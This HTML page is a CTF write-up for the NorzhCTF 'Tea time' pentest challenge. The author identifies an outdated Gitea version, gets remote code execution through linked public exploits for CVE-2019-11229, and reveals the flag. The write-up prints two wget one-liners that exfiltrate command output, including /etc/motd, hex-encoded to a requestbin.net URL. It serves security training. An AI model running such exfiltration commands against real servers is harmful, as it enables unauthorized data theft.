
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <title>Tea time (pentest, 20) · extiop's realm</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="HonKit 3.7.5">
        
        
        
    
    <link rel="stylesheet" href="../../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../../gitbook/@honkit/honkit-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../../../2020/" />
    
    
    <link rel="prev" href="../airport_hall/triskel-4.html" />
    

    </head>
    <body>
        
<div class="book honkit-cloak">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../../">
            
                <a href="../../../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../../">
            
                <a href="../../">
            
                    
                    2021
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../../CSAW-CTF-Quals/">
            
                <a href="../../CSAW-CTF-Quals/">
            
                    
                      CSAW CTF Quals
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../../CSAW-CTF-Quals/ics/tripping_breakers.html">
            
                <a href="../../CSAW-CTF-Quals/ics/tripping_breakers.html">
            
                    
                    Tripping Breakers (malware analysis, 481)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../../FwordCTF/">
            
                <a href="../../FwordCTF/">
            
                    
                      FwordCTF
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../../FwordCTF/web/parrotox.html">
            
                <a href="../../FwordCTF/web/parrotox.html">
            
                    
                    ParrotOx (web, 997)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../../CyberDefenders/">
            
                <a href="../../CyberDefenders/">
            
                    
                      CyberDefenders
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="../../CyberDefenders/DFIR/honeybot.html">
            
                <a href="../../CyberDefenders/DFIR/honeybot.html">
            
                    
                    HoneyBOT (DFIR & malware analysis, 1700)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="../../CyberDefenders/forensic/wiredive.html">
            
                <a href="../../CyberDefenders/forensic/wiredive.html">
            
                    
                    WireDive (forensic, 6275)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../../SocVel/">
            
                <a href="../../SocVel/">
            
                    
                      SocVel
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="../../SocVel/DFIR/losprys.html">
            
                <a href="../../SocVel/DFIR/losprys.html">
            
                    
                    Losprys (DFIR, 3000)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2" data-path="../../SocVel/DFIR/dikbek.html">
            
                <a href="../../SocVel/DFIR/dikbek.html">
            
                    
                    DikBek (DFIR, 3000)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.3" data-path="../../SocVel/DFIR/pooptoria.html">
            
                <a href="../../SocVel/DFIR/pooptoria.html">
            
                    
                    Pooptoria (DFIR, 3000)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../../FCSC/">
            
                <a href="../../FCSC/">
            
                    
                      FCSC
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1" data-path="../../FCSC/forensic/ordiphone-0.html">
            
                <a href="../../FCSC/forensic/ordiphone-0.html">
            
                    
                    Ordiphone0 (forensic, 42)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.2" data-path="../../FCSC/forensic/ordiphone-2.html">
            
                <a href="../../FCSC/forensic/ordiphone-2.html">
            
                    
                    Ordiphone2 (forensic, 197)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="../">
            
                <a href="../">
            
                    
                      NorzhCTF
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="../airport_hall/triskel-3.html">
            
                <a href="../airport_hall/triskel-3.html">
            
                    
                    Triskel 3 (web, 49)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="../airport_hall/triskel-4.html">
            
                <a href="../airport_hall/triskel-4.html">
            
                    
                    Triskel 4 (pentest & misc, 20)
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.8.3" data-path="tea_time.html">
            
                <a href="tea_time.html">
            
                    
                    Tea time (pentest, 20)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.9" data-path="../../../2020/">
            
                <a href="../../../2020/">
            
                    
                    2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.10" data-path="../../../2020/FwordCTF/">
            
                <a href="../../../2020/FwordCTF/">
            
                    
                      FwordCTF
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.10.1" data-path="../../../2020/FwordCTF/web/jailoo-warmup.html">
            
                <a href="../../../2020/FwordCTF/web/jailoo-warmup.html">
            
                    
                    Jailoo Warmup (web, 442)
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
            Published with HonKit
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../../.." >Tea time (pentest, 20)</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="tea-time">Tea time</h1>
<h2 id="pentest-20-points">Pentest, 20 points</h2>
<h3 id="description">Description</h3>
<p>We lost access to our versioning server, the attacker removed our ssh keys. Please get it back and connect to the server using SSH to get the flag.</p>
<p>by Masterfox</p>
<h3 id="solution">Solution</h3>
<p>This challenge was only reachable within a specific network. We could access Tea time only through a machine we compromised from a previous challenge, only with a command-line interface then, at first. After a few minutes, to be more comfortable, we designed some <code>iptables</code> rules according to <a href="https://www.ired.team/offensive-security/red-team-infrastructure/redirectors-forwarders" target="_blank">https://www.ired.team/offensive-security/red-team-infrastructure/redirectors-forwarders</a>, to access from our browsers, the challenge.</p>
<p>First, we identify the version of Gitea with its commit: we can notice <code>Gitea Version: 73ce024</code> on the footer&apos;s page. We find Gitea&apos;s version then which is <code>1.8.0 RC2</code> with this commit <a href="https://github.com/go-gitea/gitea/commit/73ce02400cec659bd7a7ee3798ff73a4c7c85957" target="_blank">https://github.com/go-gitea/gitea/commit/73ce02400cec659bd7a7ee3798ff73a4c7c85957</a>. We notice that this version was released on 27th March 2019, which is quite old. There is probably some exploits that we can use!</p>
<p>We first looked at one from Podalirius (<a href="https://www.exploit-db.com/exploits/49571" target="_blank">https://www.exploit-db.com/exploits/49571</a>) presented in his article <a href="https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/" target="_blank">https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/</a>. After some tries, we realized that we couldn&apos;t use this exploit as our Gitea&apos;s configuration didn&apos;t enable <code>Git hooks</code> by users.</p>
<p>Back to square one, we are searching for another exploit. Thanks to <a href="https://www.cvedetails.com/" target="_blank">https://www.cvedetails.com/</a> we found the <code>CVE-2019-11229</code> which enables code execution, this is interesting.</p>
<p>Thanks to <a href="https://www.exploit-db.com/exploits/49383" target="_blank">https://www.exploit-db.com/exploits/49383</a>, <a href="https://medium.com/@knownsec404team/analysis-of-cve-2019-11229-from-git-config-to-rce-32c217727baa" target="_blank">https://medium.com/@knownsec404team/analysis-of-cve-2019-11229-from-git-config-to-rce-32c217727baa</a> and some manual crafting, notably to modify the exploit as the originally designed server was not working fine, we had a RCE on the Tea time machine. Though, we had to design a specific exfiltration technique to retrieve some information from our executed commands. To list files and directories, we could do for instance the following command:</p>
<pre><code class="lang-bash">wget http://requestbin.net/r/xxx?x=$(ls | xxd -p | tr -d <span class="hljs-string">&apos;\\n&apos;</span>)
</code></pre>
<p>Okay, we have RCE, now focus back on the challenge and on what we are looking for. We thought that the flag was prompted when logging in through SSH in the SSH banner. Then, after reading some documentation such as <a href="https://www.tecmint.com/protect-ssh-logins-with-ssh-motd-banner-messages/" target="_blank">https://www.tecmint.com/protect-ssh-logins-with-ssh-motd-banner-messages/</a> we dumped <code>/etc/motd</code> content:</p>
<pre><code class="lang-bash">wget http://requestbin.net/r/xxx?x=$(cat /etc/motd | xxd -p | tr -d <span class="hljs-string">&apos;\\n&apos;</span>)
</code></pre>
<p>Which contained the flag <code>NORZH{k33p_upd4t1ng_3Veryd4y}</code></p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../airport_hall/triskel-4.html" class="navigation navigation-prev " aria-label="Previous page: Triskel 4 (pentest & misc, 20)">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../../../2020/" class="navigation navigation-next " aria-label="Next page: 2020">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Tea time (pentest, 20)","level":"1.8.3","depth":2,"next":{"title":"2020","level":"1.9","depth":1,"path":"2020/README.md","ref":"2020/README.md","articles":[]},"previous":{"title":"Triskel 4 (pentest & misc, 20)","level":"1.8.2","depth":2,"path":"2021/NorzhCTF/airport_hall/triskel-4.md","ref":"2021/NorzhCTF/airport_hall/triskel-4.md","articles":[]},"dir":"ltr"},"config":{"plugins":["mathjax@https://github.com/algorithm-archivists/plugin-mathjax"],"root":"./","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"mathjax":{"forceSVG":false,"version":"2.6.1"},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","honkit":">= 3.0.0","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"extiop's realm","gitbook":"*"},"file":{"path":"2021/NorzhCTF/developer_corner/tea_time.md","mtime":"2024-09-13T00:20:45.356Z","type":"markdown"},"gitbook":{"version":"3.7.5","time":"2024-09-13T00:34:44.779Z"},"basePath":"../../..","book":{"language":""}});
        });
    </script>
</div>

        
    <noscript>
        <style>
            .honkit-cloak {
                display: block !important;
            }
        </style>
    </noscript>
    <script>
        // Restore sidebar state as critical path for prevent layout shift
        function __init__getSidebarState(defaultValue){
            var baseKey = "";
            var key = baseKey + ":sidebar";
            try {
                var value = localStorage[key];
                if (value === undefined) {
                    return defaultValue;
                }
                var parsed = JSON.parse(value);
                return parsed == null ? defaultValue : parsed;
            } catch (e) {
                return defaultValue;
            }
        }
        function __init__restoreLastSidebarState() {
            var isMobile = window.matchMedia("(max-width: 600px)").matches;
            if (isMobile) {
                // Init last state if not mobile
                return;
            }
            var sidebarState = __init__getSidebarState(true);
            var book = document.querySelector(".book");
            // Show sidebar if it enabled
            if (sidebarState && book) {
                book.classList.add("without-animation", "with-summary");
            }
        }

        try {
            __init__restoreLastSidebarState();
        } finally {
            var book = document.querySelector(".book");
            book.classList.remove("honkit-cloak");
        }
    </script>
    <script src="../../../gitbook/gitbook.js"></script>
    <script src="../../../gitbook/theme.js"></script>
    
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-mathjax/plugin.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

